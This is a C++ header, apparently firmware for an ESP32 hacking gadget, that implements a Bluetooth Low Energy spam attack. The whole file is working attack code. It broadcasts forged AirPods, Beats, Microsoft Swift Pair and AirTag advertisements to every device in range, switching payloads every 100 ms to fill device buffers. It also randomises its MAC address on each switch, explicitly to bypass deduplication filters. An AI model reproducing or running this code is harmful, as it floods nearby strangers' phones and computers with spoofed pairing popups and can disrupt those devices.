#pragma once

#include "globals.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>

static bool bleSpamActive = false;
static uint32_t lastBleSpamMs = 0;
static int blePayloadIndex = 0;

static BLEAdvertising *pAdvertising;

// Array of hex payloads that trigger Apple/Windows popups
// Structure: Length(1 byte), Type(0xFF for manufacturer specific), Company ID (e.g. 4C 00 for Apple)
static const uint8_t ble_payloads[][30] = {
  // AirPods Pro popup
  {26, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x01, 0x0E, 0x20, 0x55, 0xAA, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66},
  // Beats Solo Pro popup
  {26, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x01, 0x0C, 0x20, 0x22, 0xAA, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66},
  // Microsoft Swift Pair
  {25, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99},
  // Apple AirTag (FindMy network spam)
  {26, 0xFF, 0x4C, 0x00, 0x12, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};

static void startBleSpam() {
  if (!bleSpamActive) {
    BLEDevice::init("");
    pAdvertising = BLEDevice::getAdvertising();
    bleSpamActive = true;
    logEvent("BLE Spam started");
  } else {
    pAdvertising->stop();
    BLEDevice::deinit();
    bleSpamActive = false;
    logEvent("BLE Spam stopped");
  }
}

static void bleSpamStep() {
  if (!bleSpamActive) return;
  uint32_t now = millis();
  
  // Switch payloads every 100ms to instantly fill device buffers
  if (now - lastBleSpamMs > 100) {
    lastBleSpamMs = now;
    
    pAdvertising->stop();
    
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
    std::string strData = "";
    
    int len = ble_payloads[blePayloadIndex][0];
    for(int i = 1; i <= len; i++) {
        strData += (char)ble_payloads[blePayloadIndex][i];
    }
    
    oAdvertisementData.addData(strData);
    pAdvertising->setAdvertisementData(oAdvertisementData);
    
    // Scramble MAC address for privacy and to bypass deduplication filters
    uint8_t rand_mac[6];
    for (int i=0; i<6; i++) rand_mac[i] = random(256);
    rand_mac[0] |= 0xC0; // Set static random bits
    esp_base_mac_addr_set(rand_mac);

    pAdvertising->start();
    
    blePayloadIndex = (blePayloadIndex + 1) % 4;
  }
  
  display.clearDisplay();
  drawHeader("BLE Packet Spam");
  display.setTextColor(1);
  display.setCursor(0, 20); display.print("Status: BROADCASTING");
  display.setCursor(0, 30); display.print("Mode: ALL DEVICES");
  display.setCursor(0, 45); 
  if (blePayloadIndex == 0) display.print("Spoof: AirPods");
  else if (blePayloadIndex == 1) display.print("Spoof: Beats Pro");
  else if (blePayloadIndex == 2) display.print("Spoof: Wi SwiftPair");
  else display.print("Spoof: AirTag");
  
  display.setCursor(0, 56); display.print("Enter=Stop");
  display.display();
}
